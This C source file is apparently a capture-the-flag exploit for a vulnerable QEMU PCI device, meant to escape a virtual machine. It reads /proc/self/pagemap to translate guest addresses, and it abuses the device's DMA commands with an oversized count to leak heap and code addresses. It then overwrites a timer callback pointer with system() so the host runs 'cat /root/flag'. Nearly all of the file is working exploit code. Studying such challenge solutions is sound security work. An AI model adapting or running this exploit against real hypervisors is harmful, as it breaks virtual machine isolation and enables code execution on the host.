#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd;
void *mmio_mem;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    size_t offset;

    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;

    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void get_continuous_pages(void *&buf0, void *&buf1) {
    void *mem;
    void *mem_arr[0x1000];
    uint64_t fn;
    uint64_t fn_arr[0x1000];
    int idx = 0;
   
    mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, 0, 0);
    *(char *)mem = 'A';
    fn_arr[idx] = gva_to_gfn(mem);
    mem_arr[idx] = mem;
    idx++;
    for (int i = 1; i < 0x1000; i++) {
        mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, 0, 0);
        *(char *)mem = 'A';
        fn = gva_to_gfn(mem);
        for (int j = 0; j < idx; j++) {
            if (fn_arr[j] == fn + 1 || fn_arr[j] + 1 == fn) {
                printf("mem: 0x%lx\n", (uint64_t) mem);
                printf("fn: 0x%lx\n", (uint64_t) fn);
                printf("mem_arr[j]: 0x%lx\n", (uint64_t) mem_arr[j]);
                printf("fn_arr[j]: 0x%lx\n", (uint64_t) fn_arr[j]);
                if (fn > fn_arr[j]) {
                    buf0 = mem_arr[j];
                    buf1 = mem;
                } else {
                    buf1 = mem_arr[j];
                    buf0 = mem;
                }
                return;
            }
        }
        fn_arr[idx] = fn;
        mem_arr[idx] = mem;
        idx++;
    }
}

void init_mmio() {
    int mmio_fd;

    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0) {
        perror("open pci");
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem < 0) {
        perror("mmap mmio_mem");
    }
}

void mmio_write(uint64_t addr, uint64_t value) {
    *((uint64_t *)((uint8_t *) mmio_mem + addr)) = value;
}

uint64_t mmio_read(uint64_t addr) {
    return *((uint64_t *)((uint8_t *) mmio_mem + addr));
}

void set_src(uint64_t src) {
    mmio_write(0x8, src);
}

void set_cnt(uint64_t cnt) {
    mmio_write(0x10, cnt);
}

/* call the timer */
void set_cmd(uint64_t cmd) {
    mmio_write(0x18, cmd);
}

void read_buf(uint64_t buf, uint64_t cnt) {
    set_src(buf);
    set_cnt(cnt);
    set_cmd(0x4);

    sleep(1);
}

void write_buf(uint64_t buf, uint64_t cnt) {
    set_src(buf);
    set_cnt(cnt);
    set_cmd(0x2);

    sleep(1);
}

void write_read_buf(uint64_t buf, uint64_t cnt) {
    set_src(buf);
    set_cnt(cnt);
    set_cmd(0x1);

    sleep(1);
}

int main() {
    void *buf0, *buf1;
    uint64_t phy_buf0, phy_buf1;
    void *userbuf;
    uint64_t phy_userbuf;

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (!fd) {
        perror("open pagemap");
        return -1;
    }

    /* get two continuous memory pages */
    get_continuous_pages(buf0, buf1);
    printf("buf0: 0x%lx\n", (uint64_t) buf0);
    printf("buf1: 0x%lx\n", (uint64_t) buf1);
    phy_buf0 = gva_to_gpa(buf0);
    phy_buf1 = gva_to_gpa(buf1);
    printf("phy_buf0: 0x%lx\n", phy_buf0);
    printf("phy_buf1: 0x%lx\n", phy_buf1);

    /* init MMIO */
    init_mmio();

    /* allocate a user buffer */
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED) {
        perror("mmap userbuf");
        return -1;
    }
    mlock(userbuf, 0x1000);
    phy_userbuf = gva_to_gpa(userbuf);
    printf("userbuf: 0x%lx\n", (uint64_t) userbuf);
    printf("phy_userbuf: 0x%lx\n", phy_userbuf);

    memset(buf0, 'A', 0x1000);
    memset(buf1, 'B', 0x1000);

    /* leak address */
    *(uint64_t *)((uint8_t *) userbuf) = 0; /* src */
    *(uint64_t *)((uint8_t *) userbuf + 0x8) = 0x1030; /* cnt */
    *(uint64_t *)((uint8_t *) userbuf + 0x10) = phy_buf0; /* dst */
    read_buf(phy_userbuf, 0x1); /* read from buffer */
    size_t heap_base = *(uint64_t *)((uint8_t *) buf1 + 0x8) - 0x243dc0;
    size_t code_base = *(uint64_t *)((uint8_t *) buf1 + 0x10) - 0x4dce80;
    printf("heap_base: 0x%lx\n", heap_base);
    printf("code_base: 0x%lx\n", code_base);
    size_t system_plt = code_base + 0x2c2180;
    printf("system_plt: 0x%lx\n", system_plt);
    size_t buf_addr = heap_base + 0xf1b470;
    printf("buf_addr: 0x%lx\n", buf_addr);

    /* overwrite ptrs */
    char cmd[] = "cat /root/flag\x00";
    memcpy(buf0, cmd, strlen(cmd));
    *(uint64_t *)((uint8_t *) buf1 + 0x10) = system_plt; /* QEMUTimerCB *cb */
    *(uint64_t *)((uint8_t *) buf1 + 0x18) = buf_addr; /* void *opaque */

    *(uint64_t *)((uint8_t *) userbuf) = phy_buf0; /* src */
    *(uint64_t *)((uint8_t *) userbuf + 0x8) = 0x1020; /* cnt */
    *(uint64_t *)((uint8_t *) userbuf + 0x10) = phy_buf0; /* dst */
    write_read_buf(phy_userbuf, 0x11);

    /* trigger vul */
    read_buf(phy_userbuf, 0x1);

    close(fd);

    return 0;
}

